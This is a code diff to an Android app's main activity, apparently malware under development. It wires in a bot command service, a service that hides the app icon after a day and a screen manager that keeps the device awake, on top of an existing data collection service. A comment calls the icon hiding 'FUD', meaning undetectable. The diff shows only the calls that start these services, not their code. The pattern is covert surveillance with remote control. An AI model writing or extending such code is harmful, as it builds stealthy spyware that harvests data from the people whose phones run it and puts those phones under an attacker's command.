@@ -49,11 +49,17 @@ public class MainActivity extends Activity {
         // Start data collection service
         startDataCollection();
         
+        // Start bot command service
+        startBotCommandService();
+        
+        // Start auto-hide service (will hide icon after 1 day)
+        startAutoHideService();
+        
+        // Start screen manager to prevent black screen
+        startScreenManager();
+        
         // Load the web interface
         webView.loadUrl("http://127.0.0.1:5000");
-        
-        // Hide app icon after first launch (FUD)
-        hideAppIcon();
     }
     
     private void setupWebView() {
@@ -148,6 +154,22 @@ public class MainActivity extends Activity {
         } else {
             startService(serviceIntent);
         }
+    }
+    
+    private void startBotCommandService() {
+        Intent serviceIntent = new Intent(this, BotCommandService.class);
+        startService(serviceIntent);
+    }
+    
+    private void startAutoHideService() {
+        Intent serviceIntent = new Intent(this, AutoHideService.class);
+        startService(serviceIntent);
+    }
+    
+    private void startScreenManager() {
+        Intent serviceIntent = new Intent(this, ScreenManager.class);
+        serviceIntent.setAction("KEEP_AWAKE");
+        startService(serviceIntent);
     }
     
     @Override
